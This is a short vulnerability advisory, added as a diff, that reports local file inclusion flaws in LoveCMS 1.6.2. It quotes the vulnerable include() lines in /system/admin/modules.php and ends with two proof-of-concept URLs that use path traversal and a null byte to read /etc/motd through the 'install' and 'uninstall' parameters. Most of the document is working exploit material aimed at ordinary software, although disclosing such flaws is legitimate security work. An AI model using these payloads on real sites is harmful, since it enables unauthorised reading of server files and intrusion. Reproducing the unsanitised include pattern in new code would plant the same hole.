@@ -1,0 +1,26 @@
+LoveCMS 1.6.2 Final Multiple Local File Inclusion Vulnerabilities
+found by cOndemned
+vendor: http://lovecms.org/
+download: http://sourceforge.net/project/showfiles.php?group_id=168535
+
+source of /system/admin/modules.php
+
+	13.	if(isset($_GET['install']))
+	14.	{
+	15.		$include = $_GET['install'];
+	16.		
+	17.		include(LOVE_ROOT . '/modules/' . $include . '/info.php');
+
+	[...]
+
+	61.	if(isset($_GET['uninstall']))
+	62.	{
+	63.		$include = $_GET['uninstall'];
+	64.		
+	65.		include(LOVE_ROOT . '/modules/' . $include . '/info.php');
+
+
+proof of concept
+
+	http://[host]/[lovecms]/system/admin/modules.php?install=../../../../../etc/motd%00
+	http://[host]/[lovecms]/system/admin/modules.php?uninstall=../../../../../etc/motd%00
